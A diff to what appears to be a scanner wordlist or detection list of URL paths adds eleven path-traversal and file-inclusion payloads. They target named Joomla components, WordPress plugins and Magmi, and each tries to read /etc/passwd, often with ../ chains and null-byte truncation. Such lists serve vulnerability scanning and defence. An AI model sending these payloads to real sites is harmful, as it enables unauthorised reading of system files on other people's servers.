@@ -134,3 +134,14 @@
 /wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00
 /wt3/forceSave.php?file=/etc/passwd
 /wp-admin/admin-ajax.php
+/index.php?option=com_jeformcr&view=../../../../../../../../etc/passwd%00
+/index.php?option=com_jresearch&controller=../../../../../../../../etc/passwd%00
+/index.php?option=com_powermail&controller=../../../../../../../../../../etc/passwd%00
+/index.php?option=com_onlineexam&controller=../../../../../../../../../../etc/passwd%00
+/index.php?option=com_smestorage&controller=../../../../../../../../../etc/passwd%00
+/index.php?option=com_picasa2gallery&controller=../../../../../../../../../../../../../../etc/passwd%00
+/propertyfinder/component/jesectionfinder/?view=../../../../../../../../../../../../../etc/passwd
+/index.php?option=com_jstore&controller=./../../../../../../../../etc/passwd%00
+/wp-content/plugins/count-per-day/download.php?n=1&f=/etc/passwd
+/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
+/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd
